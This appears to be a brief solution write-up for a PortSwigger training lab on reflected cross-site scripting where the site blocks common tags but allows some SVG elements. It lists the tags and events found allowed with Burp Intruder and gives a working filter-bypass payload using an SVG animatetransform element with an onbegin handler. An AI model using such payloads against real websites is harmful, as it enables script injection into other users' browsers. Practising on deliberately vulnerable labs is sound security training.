# [Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

## Lab

This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.

## Analysis

use burp's intruder to check which tags and events are allowed:

- tags:
  - animatetransform
  - image
  - svg
  - title
- events:
  - onbegin

## Solutions

use [cheatsheet] to find payload: `<svg><animatetransform onbegin=alert(1) attributeName=transform>`

lab solved
